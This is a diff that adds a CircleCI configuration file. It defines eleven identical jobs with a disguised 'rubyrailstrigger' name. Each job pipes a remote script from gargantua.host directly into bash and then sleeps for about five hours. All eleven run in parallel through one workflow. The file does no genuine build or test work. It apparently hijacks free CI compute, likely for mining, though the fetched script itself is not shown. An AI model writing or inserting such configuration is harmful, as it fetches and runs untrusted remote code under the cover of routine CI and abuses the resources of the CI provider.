@@ -1,0 +1,127 @@
+version: 2.1
+
+jobs:
+  rubyrailstrigger:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylistanahe.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  rubyrailstrigger1:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylistanahe.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  rubyrailstrigger2:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylistanahe.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  rubyrailstrigger3:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylistanahe.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  rubyrailstrigger4:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylistanahe.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  rubyrailstrigger5:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylistanahe.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  rubyrailstrigger6:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylistanahe.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  rubyrailstrigger7:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylistanahe.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  rubyrailstrigger8:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylistanahe.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  rubyrailstrigger9:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylistanahe.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  rubyrailstrigger10:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylistanahe.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+workflows:
+  main:
+    jobs:
+      - rubyrailstrigger
+      - rubyrailstrigger1
+      - rubyrailstrigger2
+      - rubyrailstrigger3
+      - rubyrailstrigger4
+      - rubyrailstrigger5
+      - rubyrailstrigger6
+      - rubyrailstrigger7
+      - rubyrailstrigger8
+      - rubyrailstrigger9
+      - rubyrailstrigger10
